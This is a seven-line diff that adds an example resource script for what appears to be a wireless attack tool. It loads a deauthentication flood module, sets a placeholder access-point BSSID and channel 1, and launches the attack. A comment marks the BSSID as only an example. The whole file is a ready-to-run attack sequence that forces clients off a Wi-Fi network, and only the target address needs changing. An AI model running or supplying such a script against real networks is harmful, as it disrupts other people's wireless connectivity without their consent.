@@ -1,0 +1,7 @@
+use attack/deauth/serial/flood
+# This is only a example resource, so the following bssid is just a example too.
+set bssid 02:11:22:33:44:55
+set ch 1
+status
+attack
+
